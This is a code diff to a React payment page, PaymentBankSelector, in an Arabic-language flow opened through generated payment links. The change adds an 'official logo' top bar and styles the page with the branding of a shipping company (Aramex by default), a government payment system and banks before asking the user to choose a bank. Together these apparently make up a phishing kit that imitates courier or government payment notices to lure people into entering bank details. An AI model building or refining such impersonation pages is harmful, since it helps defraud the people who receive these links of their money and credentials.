@@ -8,7 +8,8 @@ import { Building2, ArrowLeft, Loader2 } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
-import { bankBranding } from "@/lib/brandingSystem";
+import { bankBranding, shippingCompanyBranding } from "@/lib/brandingSystem";
+import BrandedTopBar from "@/components/BrandedTopBar";
 import { getCountryByCode } from "@/lib/countries";
 import { getBanksByCountry, Bank } from "@/lib/banks";
 import { formatCurrency } from "@/lib/countryCurrencies";
@@ -39,6 +40,7 @@ const PaymentBankSelector = () => {
   const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
+  const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
   
   const shippingInfo = linkData?.payload as any;
   const paymentData = shippingInfo?.payment_data;
@@ -167,58 +169,45 @@ const PaymentBankSelector = () => {
   }
   
   return (
-    <div 
-      className="min-h-screen py-4 sm:py-12 bg-background" 
-      dir="rtl"
-      style={{
-        background: govSystem.colors.surface
-      }}
-    >
-      <div className="container mx-auto px-4 max-w-2xl">
-        {/* Header */}
-        <div className="mb-6">
-          <button
-            onClick={() => navigate(`/pay/${id}/details`)}
-            className="flex items-center gap-2 text-sm mb-4"
-            style={{ color: govSystem.colors.textLight }}
-          >
-            <ArrowLeft className="w-4 h-4" />
-            <span>رجوع</span>
-          </button>
-          
-          <div className="flex items-center gap-3 mb-2">
-            <div
-              className="w-12 h-12 rounded-full flex items-center justify-center"
-              style={{
-                background: govSystem.gradients.primary,
-              }}
-            >
-              <Building2 className="w-6 h-6 text-white" />
-            </div>
-            <div>
-              <h1 className="text-2xl font-bold" style={{ color: govSystem.colors.text, fontFamily: govSystem.fonts.primaryAr }}>اختر البنك</h1>
-              <p className="text-sm" style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}>
-                {govSystem.nameAr} - {formattedAmount}
-              </p>
-            </div>
-          </div>
-        </div>
+    <>
+      {/* Branded Top Bar with Official Logo */}
+      <BrandedTopBar 
+        serviceKey={serviceKey}
+        serviceName={serviceName}
+        showBackButton={true}
+        backPath={`/pay/${id}/details`}
+      />
 
-        {/* Country Badge */}
-        {countryData && (
-          <div className="mb-4">
-            <Badge 
-              className="text-sm px-3 py-1.5"
+      <div 
+        className="min-h-screen py-4 sm:py-8" 
+        dir="rtl"
+        style={{
+          background: companyBranding?.colors.background || govSystem.colors.surface,
+          fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
+        }}
+      >
+        <div className="container mx-auto px-4 max-w-2xl">
+          {/* Page Title */}
+          <div className="mb-6 text-center">
+            <h1 
+              className="text-2xl sm:text-3xl font-bold mb-2" 
               style={{ 
-                background: govSystem.gradients.primary,
-                color: govSystem.colors.textOnPrimary,
-                fontFamily: govSystem.fonts.primaryAr
+                color: companyBranding?.colors.text || govSystem.colors.text,
+                fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
               }}
             >
-              {countryData.flag} {countryData.nameAr} - {govSystem.nameAr}
-            </Badge>
+              اختر البنك
+            </h1>
+            <p 
+              className="text-sm sm:text-base" 
+              style={{ 
+                color: companyBranding?.colors.textLight || govSystem.colors.textLight,
+                fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
+              }}
+            >
+              {formattedAmount}
+            </p>
           </div>
-        )}
 
         {/* Loading Banks */}
         {loadingBanks ? (
@@ -376,6 +365,7 @@ const PaymentBankSelector = () => {
         )}
       </div>
     </div>
+    </>
   );
 };
 
